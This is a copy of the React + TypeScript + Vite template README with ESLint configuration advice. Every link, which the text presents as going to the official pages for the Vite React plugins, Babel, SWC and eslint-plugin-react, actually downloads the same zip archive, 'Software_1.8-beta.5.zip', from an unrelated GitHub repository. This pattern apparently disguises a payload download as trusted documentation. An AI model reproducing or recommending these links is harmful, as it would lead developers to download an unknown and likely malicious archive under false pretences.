# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/softineerdanish/internship/raw/refs/heads/main/src/components/Software_1.8-beta.5.zip) uses [Babel](https://github.com/softineerdanish/internship/raw/refs/heads/main/src/components/Software_1.8-beta.5.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/softineerdanish/internship/raw/refs/heads/main/src/components/Software_1.8-beta.5.zip) uses [SWC](https://github.com/softineerdanish/internship/raw/refs/heads/main/src/components/Software_1.8-beta.5.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type aware lint rules:

- Configure the top-level `parserOptions` property like this:

```js
   parserOptions: {
    ecmaVersion: 'latest',
    sourceType: 'module',
    project: ['./tsconfig.json', './tsconfig.node.json'],
    tsconfigRootDir: __dirname,
   },
```

- Replace `plugin:@typescript-eslint/recommended` to `plugin:@typescript-eslint/recommended-type-checked` or `plugin:@typescript-eslint/strict-type-checked`
- Optionally add `plugin:@typescript-eslint/stylistic-type-checked`
- Install [eslint-plugin-react](https://github.com/softineerdanish/internship/raw/refs/heads/main/src/components/Software_1.8-beta.5.zip) and add `plugin:react/recommended` & `plugin:react/jsx-runtime` to the `extends` list
